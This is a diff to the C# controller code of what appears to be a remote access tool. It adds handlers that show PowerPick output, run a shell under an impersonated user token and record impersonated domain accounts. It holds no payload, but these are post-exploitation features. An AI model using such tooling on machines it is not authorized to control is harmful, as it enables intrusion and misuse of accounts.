@@ -1,4 +1,6 @@
 ﻿using System;
+using xServer.Core.Data;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Windows.Forms;
@@ -12,21 +14,81 @@ namespace xServer.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
     public static partial class CommandHandler
     {
-        public static void HandleDoShellExecuteResponse(Client client, DoShellExecuteResponse packet)
+
+        public static void HandleGetPowerPick(GetPowerPick packet, Client client)
         {
-            if (client.Value == null || client.Value.FrmRs == null || string.IsNullOrEmpty(packet.Output))
+            if (client.Value == null || client.Value.FrmPP == null || string.IsNullOrEmpty(packet.Output))
                 return;
 
             if (packet.IsError)
             {
-                client.Value.FrmRs.PrintError(packet.Output);
-                //QuasarServer.writeLog(packet.Output.Replace(System.Environment.NewLine, "<NL>"), client.Value.PCName);
-                
+                //Need to figure out if it will ever throw an error?
+                client.Value.FrmPP.PrintError(packet.Output);
             }
             else
             {
-                client.Value.FrmRs.PrintMessage(packet.Output);
-                //QuasarServer.writeLog(packet.Output, client.Value.PCName);
+                client.Value.FrmPP.PrintMessage(packet.Output);
+            }
+
+        }
+        public static void HandleDoShellExecuteResponse(Client client, DoShellExecuteResponse packet)
+        {
+            if (client.Value == null || (client.Value.FrmRs == null && client.Value.FrmIm == null) || string.IsNullOrEmpty(packet.Output))
+                return;
+
+
+            //This "should" work.
+            if (packet.Impersonate)
+            {
+                //Redirect to FrmShellImpersonate
+                if (packet.IsError)
+                {
+                    client.Value.FrmIm.PrintError(packet.Output);
+                    return;
+                    //QuasarServer.writeLog(packet.Output.Replace(System.Environment.NewLine, "<NL>"), client.Value.PCName);
+
+                }
+                else
+                {
+                    //Interesting FrmRs probably is the form that called the information so I can redirect input back to that.
+                    client.Value.FrmIm.PrintMessage(packet.Output);
+                    return;
+                    //QuasarServer.writeLog(packet.Output, client.Value.PCName);
+                }
+            }
+            else
+            {
+                if (packet.IsError)
+                {
+                    client.Value.FrmRs.PrintError(packet.Output);
+                    return;
+                    //QuasarServer.writeLog(packet.Output.Replace(System.Environment.NewLine, "<NL>"), client.Value.PCName);
+
+                }
+                else
+                {
+                    //Interesting FrmRs probably is the form that called the information so I can redirect input back to that.
+                    client.Value.FrmRs.PrintMessage(packet.Output);
+                    return;
+                    //QuasarServer.writeLog(packet.Output, client.Value.PCName);
+                }
+            }
+        }
+        public static void HandleDoChangeTokenResponse(GetChangeToken packet, Client client)
+        {
+            if (packet.execSuccess)
+            {
+                //This may not be the most elegant solution, but it works damn it.
+                string[] strings = packet.impersonatedUser.Split('\\');
+                //Will these three things be enough for a unique ID?
+                Impersonation user = new Impersonation(strings[0],strings[1],client.Value.Id, packet.guid);
+                FrmMain.Instance.SetStatusByClient(client, "Successfully Created a token for " + user.username);
+                //Maybe try something else for unique ID generation (GUID?)
+                FrmMain.Instance.impersonatedUsers.Add("Impersonation - "+FrmMain.Instance.impersonatedUsers.Count+1.ToString(), user);
+            }
+            else
+            {
+                FrmMain.Instance.SetStatusByClient(client, "Token change failed.");
             }
         }
 
